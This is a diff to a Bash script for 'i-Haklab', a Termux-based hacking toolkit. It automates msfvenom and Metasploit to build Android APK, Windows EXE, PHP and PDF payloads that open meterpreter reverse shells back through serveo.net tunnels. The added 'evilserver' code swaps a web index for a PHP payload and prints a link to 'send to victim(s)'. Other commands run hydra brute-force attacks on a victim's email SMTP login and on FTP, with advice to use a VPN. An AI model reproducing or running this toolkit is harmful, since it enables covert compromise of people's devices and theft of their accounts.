@@ -7,16 +7,37 @@ function ctrl_c() {
                 echo
                 printf "$Y\n[!]$R Going me on$B Telegram$R t.me/Ivam3byCinderella$W\n"
 }
-function banner {
+banner() {
 	if [ -e $iHAKLAB/.set/libexec/banner/i-Haklab ]; then
 		bash $iHAKLAB/.set/libexec/banner/i-Haklab
 		sleep 1
 	fi
 }
-function k-boom {
+k-boom() {
 	if [ -e $iHAKLAB/.set/libexec/banner/k-boom ]; then
 		bash $iHAKLAB/.set/libexec/banner/k-boom
 	fi
+}
+chk-api() {
+	command -v termux-open > /dev/null || { printf "$R[w]->$W termux-tools needed$R |$W please install it"; exit; }
+}
+chk-sudo() {
+	command -v sudo > /dev/null || { printf "$R[w]->$W sudo command needed$R |$W please install it"; exit; }
+}
+chk-msf() {
+	command -v msfconsole > /dev/null || { printf "$R\n[W]->$W Metasploit needed$R |$W please install it"; exit; }
+}
+chk-php() {
+	command -v php > /dev/null || { printf "$R\n[W]->$W php not found$R |$W run apt install php"; exit; }
+}
+chk-ssh() {
+	command -v ssh > /dev/null || { printf "$R\n[W]->$W ssh not found$R |$W run apt install openssh"; exit; }
+}
+chk-mega() {
+	command -v megadl > /dev/null || { printf "$R\n[W]->$W megatools not found$R |$W run apt install megatools"; exit; }
+}
+chk-hydra() {
+	command -v hydra > /dev/null || { printf "$R\n[W]->$W hydra not found$R |$W run apt install hydra"; exit; }
 }
 if [ -L ~/storage/external-1 ]; then
 	iHAKLAB=/data/data/com.termux/files/home/storage/external-1/roothome/i-Haklab
@@ -74,11 +95,13 @@ Arguments  |    options     |    Description
 |                     ╰─────➤ LPORT=48263 LHOST=serveo.net apk=outlan.apk
 |                             Payload=android/meterpreter/reverse_tcp
 ╰─paylink──➤─pc/nexam/soa5──➤ Create a link payload with handler
-|             ╰───|────|────➤ For targets [0]generic, [1]windows, [2]macOS and [3]linux
-|                 |    |      example: i-Haklab paylink pc 2
-|                 ╰────|────➤ For targets [0]nexxus and [29]samsung
-|                      |      example: i-Haklab paylink nexam 29
-|                      ╰────➤ For android operative system equal at version 5 to down
+|    |        ╰───|────|────➤ For targets [0]generic, [1]windows, [2]macOS and [3]linux
+|    |            |    |      example: i-Haklab paylink pc 2
+|    |            ╰────|────➤ For targets [0]nexxus and [29]samsung
+|    |                 |      example: i-Haklab paylink nexam 29
+|    |                 ╰────➤ For android operative system equal at version 5 to down
+|    ╰─────➤───evilserver───➤ Create a php file with a reverse payload
+╰──paypdf──➤────────────────➤ Create a pdf file with a reverse payload
 ╰──payexe──➤──inlan/outlan──➤ Create a coded payload .exe with msfvenom
 |               ╰─────|─────➤ LPORT=4546 Payload=windows/meterpreter/reverse_tcp file=inlan.exe
 |                     ╰─────➤ LPORT=48263 Payload=windows/meterpreter/reverse_tcp
@@ -115,7 +138,7 @@ elif [ $1 = show ] && [ $2 ]; then
 		read ANSW
 		let TUTO=$(cat $iHAKLAB/.set/libexec/Tutorials/List | grep -oE $ANSW )
 		if [ "$ANSW" = $TUTO ]; then
-			command -v termux-open > /dev/null || { printf "$R[w]->$W termux-tools needed$R |$W please install it"; exit; }
+			chk-api
 			termux-open https://t.me/Ivam3byCinderella/$ANSW
 		else
 			clear
@@ -142,6 +165,7 @@ elif [ $1 = install ] && [ $2 ]; then
 		printf "$R[w]->$W Book option needs the book number\n"
 	elif [ $2 = "books" ] && [ ! -z $3 ]; then
 		BOOK=$(cat -n $iHAKLAB/.set/libexec/Books/List | grep $3 | awk '{print $NF}')
+		chk-mega
 		megadl https://mega.nz/$BOOK
 	elif [ "$TOOL" = $2 ]; then
 		bash $iHAKLAB/.set/to-install/$TOOL
@@ -200,12 +224,13 @@ elif [ $1 = apk ] && [ $2 ]; then
 		if [ ! -d ~/java/handler ]; then
 			mkdir -p ~/java/handler
 		fi
+		chk-msf
 		msfvenom -p android/meterpreter/reverse_tcp LHOST=$LOCALHOST LPORT=4546 -e x86/shikata_ga_nai -i 5 -a dalvik --platform android -o inlan.apk > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n"
 		echo "use exploit/multi/handler" > ~/java/handler/inlan.apk.rc
 		echo "set PAYLOAD android/meterpreter/reverse_tcp" >> ~/java/handler/inlan.apk.rc
 		echo "set LHOST $LOCALHOST" >> ~/java/handler/inlan.apk.rc
 		echo "set LPORT 4546" >> ~/java/handler/inlan.apk.rc
-		echo "set run" >> ~/java/handler/inlan.apk.rc
+		echo "run" >> ~/java/handler/inlan.apk.rc
 		printf "$Y[i]->$W Payload saved as$G inlan.apk$W\n"
 		printf "$Y[i]->$W Handler file saved as$G inlan.apk.rc$W\n"
 	elif [ $2 = outlan ]; then
@@ -213,12 +238,13 @@ elif [ $1 = apk ] && [ $2 ]; then
 		if [ ! -d ~/java/handler ]; then
 			mkdir -p ~/java/handler
 		fi
+		chk-msf
 		msfvenom -p android/meterpreter/reverse_tcp LHOST=serveo.net LPORT=48263 -e x86/shikata_ga_nai -i 5 -a dalvik --platform android -o outlan.apk > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n" 
 		echo "use exploit/multi/handler" > ~/java/handler/outlan.apk.rc
 		echo "set PAYLOAD android/meterpreter/reverse_tcp" >> ~/java/handler/outlan.apk.rc
 		echo "set LHOST $LOCALHOST" >> ~/java/handler/outlan.apk.rc
 		echo "set LPORT 4546" >> ~/java/handler/outlan.apk.rc
-		echo "set run" >> ~/java/handler/outlan.apk.rc
+		echo "run" >> ~/java/handler/outlan.apk.rc
 		printf "$Y[i]->$W Payload saved as$G outlan.apk$W\n"
 		printf "$Y[i]->$W Handler file saved as$G outlan.apk.rc$W\n"
 	else
@@ -232,12 +258,13 @@ elif [ $1 = payexe ] && [ $2 ]; then
 		if [ ! -d ~/java/handler ]; then
 			mkdir -p ~/java/handler
 		fi
+		chk-msf
                 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$LOCALHOST LPORT=4546 -f exe -e x86/shikata_ga_nai -i 5 -o inlan.exe > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n"
                 echo "use exploit/multi/handler" > ~/java/handler/inlan.exe.rc
                 echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> ~/java/handler/inlan.exe.rc
                 echo "set LHOST $LOCALHOST" >> ~/java/handler/inlan.exe.rc
                 echo "set LPORT 4546" >> ~/java/handler/inlan.ex.rc
-                echo "set run" >> ~/java/handler/inlan.exe.rc
+                echo "run" >> ~/java/handler/inlan.exe.rc
                 printf "$Y[i]->$W Payload saved as$G inlan.exe$W\n"
                 printf "$Y[i]->$W Handler file saved as$G inlan.exe.rc$W\n"
         elif [ $2 = outlan ]; then
@@ -245,12 +272,13 @@ elif [ $1 = payexe ] && [ $2 ]; then
 		if [ ! -d ~/java/handler ]; then
 			mkdir -p ~/java/handler
 		fi
+		chk-msf
 		msfvenom -p windows/meterpreter/reverse_tcp LHOST=serveo.net LPORT=48263 -f exe -e x86/shikata_ga_nai -i 5 -o outlan.exe > /dev/null || printf "$R[w]-> O-ops!! join to t.me/Ivam3_Bot$W\n"
                 echo "use exploit/multi/handler" > ~/java/handler/outlan.exe.rc
                 echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> ~/java/handler/outlan.exe.rc
                 echo "set LHOST $LOCALHOST" >> ~/java/handler/outlan.exe.rc
                 echo "set LPORT 4546" >> ~/java/handler/outlan.exe.rc
-                echo "set run" >> ~/java/handler/outlan.exe.rc
+                echo "run" >> ~/java/handler/outlan.exe.rc
                 printf "$Y[i]->$W Payload saved as$G outlan.exe$W\n"
                 printf "$Y[i]->$W Handler file saved as$G outlan.exe.rc$W\n"
         else
@@ -278,13 +306,15 @@ elif [ $1 = paylink ] && [ $2 = pc ] && [ $3 ]; then
 				echo "set target $3" >> ~/java/handler/paylink-pc-$3.rc
 				echo "run" >> ~/java/handler/paylink-pc-$3.rc
 				if [ $CHECKROOT = "root" ]; then
-					command -v sudo > /dev/null || { printf "$R[w]->$W sudo command needed$R |$W please install it"; exit; }
+					chk-sudo
+					chk-msf
 					printf "$Y[i]->$W Handler file saved as$G paylink-pc-$3.rc$W\n"
 					sleep 1
 					sudo msfconsole -q -r ~/java/handler/paylink-pc-$3.rc
 				else
 					printf "$Y[i]->$W Handler file saved as$G paylink-pc-$3.rc$W\n"
 					sleep 1
+					chk-msf
 					msfconsole -q -r ~/java/handler/paylink-pc-$3.rc
 				fi
 			else
@@ -312,13 +342,15 @@ elif [ $1 = paylink ] && [ $2 = nexam ] && [ $3 ]; then
                                 echo "set target $3" >> ~/java/handler/paylink-nexam-$3.rc
                                 echo "run" >> ~/java/handler/paylink-nexam-$3.rc
                                 if [ $CHECKROOT = "root" ]; then
-					command -v sudo > /dev/null || { printf "$R[w]->$W sudo command needed$R |$W please install it"; exit; }
+					chk-sudo
+					chk-msf
 					printf "$Y[i]->$W Handler file saved as$G paylink-nexam-$3.rc$W\n"
 					sleep 1
                                         sudo msfconsole -q -r ~/java/handler/paylink-nexam-$3.rc
                                 else
 					printf "$Y[i]->$W Handler file saved as$G paylink-nexam-$3.rc$W\n"
 					sleep 1
+					chk-msf
                                         msfconsole -q -r ~/java/handler/paylink-nexam-$3.rc
                                 fi
                         else
@@ -341,32 +373,79 @@ elif [ $1 = paylink ] && [ $2 = soa5 ]; then
                 echo "set URIPATH /" >> ~/java/handler/paylink-soa5.rc
                 echo "run" >> ~/java/handler/paylink-soa5.rc
 		if [ $CHECKROOT = "root" ]; then
-			command -v sudo > /dev/null || { printf "$R[w]->$W sudo command needed$R |$W please install it"; exit; }
+			chk-sudo
+			chk-msf
 			printf "$Y[i]->$W Handler file saved as$G paylink-soa5.rc$W\n"
 			sleep 1
 			sudo msfconsole -q -r ~/java/handler/paylink-soa5.rc
                 else
 			printf "$Y[i]->$W Handler file saved as$G paylink-soa5.rc$W\n"
 			sleep 1
+			chk-msf
                         msfconsole -q -r ~/java/handler/paylink-soa5.rc
                 fi
         else
                 printf "$R[w]->$W File paylink-nexam-soa5.rc already exist\n"
         fi
+elif [ $1 = paylink ] && [ $2 = evilserver ]; then
+	chk-sudo
+	chk-msf
+	chk-php
+phpayload() {
+	printf "$G[-]-> i-Haklab :$W creating payload$Y (it could take a while)$W\n"
+	if [ -e $SERVERPATH/index.php ]; then
+		mv $SERVERPATH/index.php $SERVERPATH/index.php.O
+	fi
+	msfvenom -f raw -p php/meterpreter/reverse_tcp LHOST=$LOCALHOST LPORT=4826 > $SERVERPATH/index.php
+	}
+handler() {
+	echo "use exploit/multi/handler" > ~/java/handler/evilserver.rc
+	echo "set PAYLOAD php/meterpreter/reverse_tcp" >> ~/java/handler/evilserver.rc
+	echo "set LHOST $LOCALHOST" >> ~/java/handler/evilserver.rc
+        echo "set LPORT 4826" >> ~/java/handler/evilserver.rc
+        echo "run" >> ~/java/handler/evilserver.rc
+	}
+phpend() {
+	printf "$G[-]-> i-Haklab :$W send to victim(s) :$Y http://$LOCALHOST:$LPORT\n$W"
+	printf "$Y[!]-> i-Haklab :$W now open another window and active the handler mode executing$G i-Haklab handler evilserver.rc$W\n"
+	printf "$G[-]-> i-Haklab :$W press$R CTRL+C$W to stop\n"
+	}
+clean() {
+	if [ -e $SERVERPATH/index.php.O ]; then
+		cat $SERVERPATH/index.php.O > index.php
+		rm $SERVERPATH/index.php.O
+	fi
+	}
+	banner
+	printf "$G[-]-> i-Haklab :$W creating server path\n"
+	sleep 2
+	if [ ! -d $PREFIX/var/service/php/ ]; then
+		mkdir -p $PREFIX/var/service/php
+	fi
+	SERVERPATH=/data/data/com.termux/files/usr/var/service/php/
+	phpayload
+	handler
+	phpend
+	if [ $CHECKROOT = 'root' ]; then
+		sudo php -S $LOCALHOST:$LPORT -t $SERVERPATH > /dev/null
+	else
+		php -S $LOCALHOST:$LPORT -t $SERVERPATH > /dev/null
+	fi
+	clean
 elif [ $1 = serveo ] && [ -z $2 ]; then
-	command -v ssh > /dev/null || { printf "$R\n[W]->$W ssh not found$R |$W run apt install openssh"; exit; }
 	if [ $SSH = "1" ]; then 
 		killall -2 ssh > /dev/null
 	fi
 	banner
-	ssh -R 48263:$LOCALHOST:4546 serveo.net
+	chk-ssh
+	ssh -R 48263:$LOCALHOST:$LPORT serveo.net
 elif [ $1 = serveo ] && [ $2 ]; then
 	LINK=$2
-	command -v ssh > /dev/null printf "$R\n[W]->$W ssh not found$R |$W run apt install openssh"
 	if [ $SSH = "1" ]; then 
 		killall -2 ssh > /dev/null 
 	fi
 	banner
+	chk-ssh
 	ssh -R $LINK:80:$LOCALHOST:$LPORT serveo.net
 elif [ $1 = handler ] && [ -z $2 ]; then
 	banner
@@ -379,17 +458,20 @@ elif [ $1 = handler ] && [ -z $2 ]; then
 elif [ $1 = handler ] && [ $2 ]; then
 	if [ -e ~/java/handler/$2 ]; then
 		if [ $CHECKROOT = "root" ]; then
-			command -v sudo > /dev/null || { printf "$R[w]->$W sudo command needed$R |$W please install it"; exit; }
 			banner
+			chk-sudo
+			chk-msf
 			sudo msfconsole -q -r ~/java/handler/$2
 		else 
 			banner
+			chk-msf
 			msfconsole -q -r ~/java/handler/$2
 		fi
 	else
 		printf "$R[w]->$W File $2 doesn't exist\n"
 	fi
 elif [ $1 = shodan ]; then
+	chk-msf
 	if [ ! -e $PREFIX/opt/metasploit-framework/documentation/api/apikey ]; then
 		touch $PREFIX/opt/metasploit-framework/documentation/api/apikey
 	fi
@@ -422,6 +504,26 @@ elif [ $1 = shodan ]; then
 	printf "\n\tpress$G ENTER$W to continue\n"
 	read enter
         msfconsole -q -r ~/java/handler/shodan-cam.rc
+elif [ $1 = paypdf ] && [ -z $2 ]; then
+	printf "$R[w]->$W argument paypdf need a pdf file name\n"
+elif [ $1 = paypdf ] && [ $2 ]; then
+	banner
+	chk-msf
+	printf "$G[-]-> i-Haklab :$W creating pdf file and running handler\n"
+	echo "use exploit/android/fileformat/adobe_reader_pdf_js_interface" > ~/java/handler/paypdf.rc
+	echo "set LHOST serveo.net" >> ~/java/handler/paypdf.rc
+        echo "set LPORT 48263" >> ~/java/handler/paypdf.rc
+	echo "set FILENAME $2.pdf" >> ~/java/handler/paypdf.rc
+        echo "run" >> ~/java/handler/paypdf.rc
+	echo "use exploit/multi/handler" >> ~/java/handler/paypdf.rc
+	echo "set LHOST $LOCALHOST" >> ~/java/handler/paypdf.rc
+	echo "set LPORT $LPORT" >> ~/java/handler/paypdf.rc
+	echo "run" >> ~/java/handler/paypdf.rc
+	if [ $CHECKROOT = 'root' ]; then
+		sudo msfconsole -q -r ~/java/handler/paypdf.rc
+	else
+		msfconsole -q -r ~/java/handler/paypdf.rc
+	fi
 elif [ $1 = bfmail ] && [ -z $2 ]; then
         printf "$R[w]->$W bfmail argument need a mail/victim as option 1$G\n[ex]->$W i-Haklab bfmail victim@gmail.com passwords.txt"
 elif [ $1 = bfmail ] && [ $2 ] && [ -z $3 ]; then
@@ -442,6 +544,7 @@ elif [ $1 = bfmail ] && [ $2 ] && [ $3 ]; then
 		else
 			printf "$R[w]->$W There is not a valid server"
 		fi
+		chk-hydra
                 hydra -S -l $2 -P $3 -e ns -V -s 465 $SMTP smtp
         fi
 elif [ $1 = bfftp ] && [ -z $2 ]; then
@@ -458,6 +561,7 @@ elif [ $1 = bfftp ] && [ $2 ] && [ $3 ] && [ $4 ]; then
         elif [ -e $2 ] && [ -e $3 ]; then
                 printf "$R[w]-> USE SOME VPN <-[w]$W\n  press$G enter$W to start"
                 read enter
+		chk-hydra
                 hydra -L $2 -P $3 $4 ftp
         fi
 elif [ $1 = evilurl ]; then
